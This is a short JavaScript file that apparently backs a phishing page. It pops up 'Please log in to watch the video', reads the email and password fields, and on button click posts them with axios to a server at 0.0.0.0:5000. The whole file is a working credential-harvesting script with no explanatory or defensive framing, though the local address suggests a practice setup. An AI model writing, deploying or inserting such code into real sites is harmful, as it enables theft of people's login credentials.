alert("Please log in to watch the video");

const email = document.querySelector(".email");
const pass = document.querySelector(".password");
const btn = document.querySelector("#loginbutton");

btn.addEventListener("click", event);

function event() {
  const formData = {
    email:email.value,
    pass:pass.value
  }
  axios
    .post("http://0.0.0.0:5000/", {
      formData,
    })
    .then((response) => {
      console.log(response);
    })
    .catch((error) => {
      console.log(error);
    });
}
